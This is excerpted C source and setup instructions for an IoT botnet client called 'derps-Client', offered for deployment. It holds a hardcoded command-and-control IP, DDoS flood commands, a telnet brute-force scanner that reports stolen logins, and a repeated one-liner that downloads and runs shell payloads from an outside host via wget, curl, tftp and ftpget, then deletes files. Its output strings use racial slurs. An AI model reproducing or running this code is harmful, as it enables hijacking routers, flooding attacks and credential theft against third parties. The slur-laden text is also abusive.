...
___________             ___.                 
\_   _____/______   ____\_ |__  __ __  ______
...
Current Owner Count - 1
 ...
 1. Replace all 74.91.124.166 with your vps ip.
 2. Save the file
 3. Upload the derps.py and the derps-Client.c to your server
 4. Go to the directory where you uploaded it
 5. Type python derps.py derps-Client.c <VPS IP>
...
!* STOPATTK-------------------------------------- Stops All Attacks

!* NIGGERKILL------------------------------------ Kills Inactive Bots

!* TELSCAN ON------------------------------------ Starts Telnet Scanner

!* PYTHON 1|2|3|DOWNLOAD------------------------- Starts The Python Scanner

!* UPDATE---------------------------------------- Reinfects the bot with new client

!* VIEWPAGE <URL>-------------------------------- Sends 1 Http Request to the URL

!* CNC <IP> <PORT> <TIME>------------------------ CNC Flood

!* STD <IP> <PORT> <TIME>------------------------ STD Flood

!* SPOOF <IP> <PORT>----------------------------- HOLD Flood
...
#define VERSION "derps-Client-V1.5"
#define NETIS "AA\x00\x00AAAA"
int userID = 1;
unsigned char *commServer[] = { "74.91.124.166" };
int Server_Botport = 572;
...
char *hvgsgd = "cd /tmp; wget http://74.91.124.166/bob.sh; curl -O http://74.91.124.166/bob.sh; chmod 777 bob.sh; sh bob.sh; tftp 74.91.124.166 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 74.91.124.166; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 74.91.124.166 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf bob.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *\r\n";
...
sprintf(payload2, "%s cd /tmp; wget http://74.91.124.166/bob.sh; curl -O http://74.91.124.166/bob.sh; chmod 777 bob.sh; sh bob.sh; tftp 74.91.124.166 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 74.91.124.166; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 74.91.124.166 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf bob.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *\r\n x00", NETIS);
                        ...
                        case 10:
                                {
                                    ...
                                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                    {
										fds[i].totalTimeout = 0;
										fds[i].bufUsed = 0;
										send(fds[i].fd, "cd /tmp; wget http://74.91.124.166/bob.sh; curl -O http://74.91.124.166/bob.sh; chmod 777 bob.sh; sh bob.sh; tftp 74.91.124.166 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 74.91.124.166; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 74.91.124.166 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf bob.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
										NiggerPrint(NiggahPrinter, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
										continue;
...
void updatemybins(){
        ...
        if ( (pid = fork()) == 0) {
				system("cd /tmp; wget http://74.91.124.166/bob.sh; curl -O http://74.91.124.166/bob.sh; chmod 777 bob.sh; sh bob.sh; tftp 74.91.124.166 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 74.91.124.166; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 74.91.124.166 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf bob.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *");
                sleep(20);
        } else {
                printf("%d\n", pid);
        }
...
void processCmd(int argc, unsigned char *argv[]){
	int x;
		if(!strcmp(argv[0], "PYTHON"))
		{
			...
			{
				system("yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://74.91.124.166/scan.py");
				NiggerPrint(NiggahPrinter, "Installing Shit For Python Scannah");
			}
			if(!strcmp(argv[1], "1"))
			{
				system("cd /.tmp;python scan.py 500 B 119.93 3");
				NiggerPrint(NiggahPrinter, "Starting Pythong Scannah (119.93)");
			}
			if(!strcmp(argv[1], "2"))
			{
				system("cd /.tmp;python scan.py 500 B 49.144 3");
				NiggerPrint(NiggahPrinter, "Starting Pythong Scannah (49.144)");
			}
			if(!strcmp(argv[1], "3"))
			{
				system("cd /.tmp;python scan.py 500 LUCKY2 lucky2 1");
...
int main(int argc, unsigned char *argv[])
{
	...
	if(initConnection()) { sleep(5); continue; }
		NiggerPrint(NiggahPrinter, "\x1b[36;1mEnslaved Another Bitches Router! > \x1b[1;31m| \x1b[1;37mIP: \x1b[1;35m%s \x1b[1;31m| \x1b[1;37mType: \x1b[1;35m%s \x1b[1;31m| \x1b[1;37mVersion: \x1b[1;35m%s", inet_ntoa(ourIP), getBuild(), VERSION);
		botkiller();
		RemoveTMP();
		char commBuf[4096];
		int got = 0;
